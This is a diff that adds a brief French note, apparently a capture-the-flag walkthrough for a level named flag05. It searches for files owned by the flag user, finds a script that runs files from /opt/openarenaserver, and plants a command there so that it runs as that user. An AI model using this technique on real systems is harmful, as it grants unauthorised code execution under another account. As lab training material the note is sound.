@@ -1,0 +1,5 @@
+find / -user flag05
+on trouve /usr/sbin/openarenaserver
+on voit qu'il execute les fichiers qui se trouve dans /opt/openarenaserver
+echo "getflag > /tmp/xd" > /opt/openarenaserver/getflag
+/tmp/xd contient le truc, c'est bon
